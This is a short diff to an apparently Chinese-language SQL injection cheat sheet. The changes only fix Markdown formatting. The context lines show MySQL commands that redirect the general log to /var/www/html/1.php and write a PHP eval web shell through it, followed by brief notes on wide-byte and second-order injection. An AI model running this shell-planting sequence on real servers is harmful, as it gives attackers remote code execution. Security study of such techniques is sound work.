@@ -250,12 +250,13 @@ set global general_log = on;  #开启general log模式
 set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址
 
 select '<?php eval($_POST[cmd]);?>'  #写入shell
-``` 
+```   
+
 # 宽字节注入
 [宽字节注入笔记][4]
 宽字节存在常见有两个情况，addslashes()和mysql_real_escape_string()
 
-#二次排序注入（储存注入）
+# 二次排序注入（储存注入）
 常见的情况是插入的时候转义了(\')，不能注入，但是可以把注入语句(\')储存到数据库('),这样如果某个地方再调用了这个值且没检查，来拼接到SQL语句里，就可能产生注入。就是多一步储存而已，没啥特殊的。
 
 
